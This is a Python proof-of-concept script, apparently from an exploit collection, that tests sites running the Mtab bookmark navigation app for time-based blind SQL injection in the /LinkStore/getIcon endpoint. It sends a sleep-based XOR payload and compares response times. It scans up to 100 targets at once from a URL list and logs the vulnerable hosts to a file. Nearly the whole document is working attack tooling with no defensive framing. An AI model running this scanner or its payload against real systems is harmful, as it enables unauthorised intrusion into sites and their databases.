#Mtab书签导航程序 LinkStoregetIcon SQL注入漏洞
#title="Mtab书签
import sys  
import requests  
import argparse  
from multiprocessing.dummy import Pool  
requests.packages.urllib3.disable_warnings()  

def main():  
    parse = argparse.ArgumentParser(description='Mtab书签-SQL')  
    parse.add_argument('-u', '--url', dest='url', type=str, help='输入一个url')  
    parse.add_argument('-f', '--file', dest='file', type=str, help='输入一个文件名')  
    args = parse.parse_args()  
    if args.url and not args.file:  
        poc(args.url)  
    elif args.file and not args.url:  
        url_list = []  
        with open(args.file, 'r', encoding='utf-8') as f:  
            for line in f.readlines():
                url_list.append(line.strip()) 
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join() 
    else:  
        print("请提供一个URL或文件名。")  

def poc(target):  
    payload = "/LinkStore/getIcon"  
    data =  {"url":"'XOR(if(now()=sysdate(),sleep(5),0))XOR'"}
    headers = {  
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Content-Type':'application/json',
        'Connection': 'Keep-alive',
    }  
    headers2={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
    }
  
    try:  
          
        res1 = requests.get(url=target + payload, timeout=10, verify=False, headers=headers2, data='')  
        time1 = res1.elapsed.total_seconds()  
        res2 = requests.post(url=target + payload, headers=headers, timeout=10, verify=False, json=data)  
        time2 = res2.elapsed.total_seconds()  
  
        if time2 - time1 >= 4.8:   
            print(f"{target} 存在SQL注入")  
            with open('result.txt', 'a', encoding='utf-8') as f:  
                f.write(target + '\n')  
    except requests.exceptions.RequestException as e:  
       pass 

if __name__ == '__main__':  
    main()